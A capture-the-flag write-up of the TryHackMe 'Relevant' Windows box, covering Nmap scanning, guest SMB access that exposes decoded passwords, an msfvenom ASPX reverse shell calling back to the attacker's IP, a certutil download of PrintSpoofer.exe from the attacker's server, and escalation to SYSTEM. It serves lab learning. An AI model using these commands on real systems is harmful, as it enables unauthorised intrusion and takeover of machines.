### Name: Relevant
### Ip: 10.10.28.224
### Difficulty: Medium

----------------------------------------------------------------

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    - User.txt
    - Root.txt

Additionally, the client has provided the following scope allowances:

    - Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
    - Locate and note all vulnerabilities found
    - Submit the flags discovered to the dashboard
    - Only the IP address assigned to your machine is in scope
    - Find and report ALL vulnerabilities (yes, there is more than one path to root)

--------------------------------------------------------------------------    

![10524728b2b462e8d164efe4e67ed087.jpeg](..assets/relevant_assets/10524728b2b462e8d164efe4e67ed087.jpeg)

### Enumeration

I'll begin enumerating this machine by scanning all TCP ports using Nmap:

```text
┌──(ryan㉿kali)-[~/THM/Relevant]
└─$ sudo nmap -p- --min-rate 10000 10.10.28.224    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 14:03 CDT
Nmap scan report for 10.10.28.224
Host is up (0.17s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds
```

Let's enumerate a bit deeper by also using the `-sC` and `-sV` flags to use default scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/THM/Relevant]
└─$ sudo nmap -sC -sV 10.10.28.224 -p 80,135,139,445,3389,49663
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 14:05 CDT
Nmap scan report for 10.10.28.224
Host is up (0.18s latency).

PORT      STATE SERVICE        VERSION
80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server?
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2023-06-27T18:56:40
|_Not valid after:  2023-12-27T18:56:40
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2023-06-28T19:07:20+00:00
|_ssl-date: 2023-06-28T19:07:59+00:00; 0s from scanner time.
49663/tcp open  http           Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
| smb2-time: 
|   date: 2023-06-28T19:07:22
|_  start_date: 2023-06-28T18:57:35
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-28T12:07:21-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.02 seconds
```

Navigating to the site on port 80 we find an IIS default landing page:

landing_page.png

Before enumerating http let's take a look at the SMB shares to see if we can find anything interesting.

Using CrackMapExec we see that we have read and write access to the nt4wrksv share using the guest account with null for a password. Let's use SMBClient to further enumerate:

smb_passwords.png

Ok interesting, looks like we've found a couple passwords. This appears to be Base64, so lets try to decode these:

b64_passwds.png

So it appears we now have two sets of credentials:

```text
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```
### Exploitation 

Before leaving SMB, I recall that we had both read and write permissions to the share. Let's try upload a reverse shell to see if we can get an easy win and get access to the box.

I'll create a reverse shell using msfvenom:

```text
┌──(ryan㉿kali)-[~/THM/Relevant]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.61.45 LPORT=443 -a x64 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3420 bytes
```

And while still logged into the SMB share I can simply issue the `put` command to uplaod my shell.

`put shell.aspx`

I set up a NetCat listener and turned my attention to the browser to see where my shell may have been uploaded. 

I had no luck on port 80 at http://10.10.28.224/nt4wrksv/shell.aspx

shell_fail.png

But looking back over my nmap scans I noticed the box had another http port open. I was able to succesfully trigger my shell by navigating to http://10.10.28.224:49663/nt4wrksv/shell.aspx

Which called back to my nc listener and gave me a working shell:

first_shell.png

And from here I can grab the user.txt flag from Bob's desktop:

user_flag.png

Let's now turn our attention to escalating privileges to administrator!

### Privilege Escalation

Running `whoami /all` shows me that SeImpersonatePrivilege is enabled on the machine.

impersonate.png

Nice! This should make for an easy privilege escalation. Because this is a Windows 10 box, let's try using PrintSpoofer.exe to escalate to the Administrator user.

Firstly I'll set up a Python webserver in the directory I keep PrinteSpoofer in:

And then afterwards I'll use CertUtil to donwload the file onto the target:

```text
C:\Users\Bob\Desktop>certutil -urlcache -split -f "http://10.6.61.45/PrintSpoofer.exe"
certutil -urlcache -split -f "http://10.6.61.45/PrintSpoofer.exe"
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```

We can also verify a code 200 from the Python server:

```text
┌──(ryan㉿kali)-[~/Tools/privesc]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.28.224 - - [28/Jun/2023 14:45:41] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
10.10.28.224 - - [28/Jun/2023 14:45:44] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
```

Once PrintSpoofer is on the target I simply execute:

```text
C:\Users\Bob\Desktop>PrintSpoofer.exe -i -c cmd
```
And I can verify that the exploit worked and am now nt authoirty\system on the machine:

system.png

All that's left to do now is to grab the root.txt flag in the Administrator's Desktop:

root_flag.png

And that's that! Thanks for following along!

-Ryan

------------------------------------------------------------------
